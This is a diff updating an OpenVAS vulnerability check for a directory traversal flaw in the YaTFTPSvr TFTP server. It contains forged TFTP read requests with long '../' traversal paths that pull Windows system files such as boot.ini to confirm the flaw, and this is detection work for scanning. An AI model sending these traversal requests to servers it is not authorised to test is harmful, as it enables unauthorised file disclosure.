@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_YaTFTPSvr_50441.nasl 10411 2018-07-05 10:15:10Z cfischer $
+# $Id: gb_YaTFTPSvr_50441.nasl 12098 2018-10-25 13:07:45Z cfischer $
 #
 # YaTFTPSvr TFTP Server Directory Traversal Vulnerability
 #
@@ -28,17 +28,18 @@ if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103321");
   script_bugtraq_id(50441);
-  script_version("$Revision: 10411 $");
+  script_version("$Revision: 12098 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
   script_name("YaTFTPSvr TFTP Server Directory Traversal Vulnerability");
-  script_tag(name:"last_modification", value:"$Date: 2018-07-05 12:15:10 +0200 (Thu, 05 Jul 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-25 15:07:45 +0200 (Thu, 25 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-11-01 08:00:00 +0100 (Tue, 01 Nov 2011)");
   script_category(ACT_ATTACK);
   script_family("Remote file access");
   script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
-  script_dependencies("tftpd_detect.nasl", "global_settings.nasl");
+  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
   script_require_udp_ports("Services/udp/tftp", 69);
+  script_mandatory_keys("Host/runs_windows");
   script_exclude_keys("keys/TARGET_IS_IPV6");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50441");
@@ -66,46 +67,56 @@ if(description)
   exit(0);
 }
 
-if(TARGET_IS_IPV6())exit(0);
+include("host_details.inc");
+include("misc_func.inc");
 
-port = get_kb_item("Services/udp/tftp");
+if( TARGET_IS_IPV6() )
+  exit( 0 );
 
-if(!port){
+port = get_kb_item( "Services/udp/tftp" );
+if( ! port )
   port = 69;
-}
 
-if(!get_port_state(port))exit(0);
+if( ! get_port_state( port ) )
+  exit( 0 );
 
-file = "../../../../../../../../../../../../../../boot.ini";
+files = traversal_files( "Windows" );
 
-req = '\x00\x01'+file+'\0netascii\0';
-sport = rand() % 64512 + 1024;
+foreach pattern( keys( files ) ) {
 
-ip = forge_ip_packet(ip_hl:5, ip_v:4, ip_tos:0, ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP, ip_src: this_host());
-u = forge_udp_packet(ip:ip, uh_sport: sport, uh_dport:port, uh_ulen:8 + strlen(req), data:req);
+  file = files[pattern];
+  # nb: Workaround as egrep might not match the response due to non printable characters in the response
+  pattern = str_replace( find:"\[", string:file, replace:"[" );
+  pattern = str_replace( find:"\]", string:file, replace:"]" );
+  pattern = str_replace( find:"supporT", string:file, replace:"support" );
+  file = "../../../../../../../../../../../../../../" + file;
 
-filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';
+  req = '\x00\x01' + file + '\0netascii\0';
+  sport = rand() % 64512 + 1024;
 
-for (i = 0; i < 2; i ++) {
+  ip = forge_ip_packet( ip_hl:5, ip_v:4, ip_tos:0, ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP, ip_src: this_host() );
+  u = forge_udp_packet( ip:ip, uh_sport:sport, uh_dport:port, uh_ulen:8 + strlen( req ), data:req );
 
-  rep = send_packet(u, pcap_active:TRUE, pcap_filter:filter);
+  filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';
 
-  if(rep) {
+  for( i = 0; i < 2; i++ ) {
 
-    data = get_udp_element(udp: rep, element:"data");
-    if (data[0] == '\0' && data[1] == '\x03') {
+    rep = send_packet( u, pcap_active:TRUE, pcap_filter:filter );
 
-       c = substr(data, 4);
+    if( ! rep )
+      continue;
 
-       if("[boot loader]" >< c) {
-         security_message(port:port);
-	 exit(0);
-       }
+    data = get_udp_element( udp:rep, element:"data" );
+    if( data[0] == '\0' && data[1] == '\x03' ) {
 
+      c = substr( data, 4 );
+      if( pattern >< c ) {
+        report = "Received data: " + c;
+        security_message( port:port, data:report, proto:"udp" );
+        exit( 0 );
+      }
     }
-
   }
-
 }
 
-exit(99);
+exit( 0 );
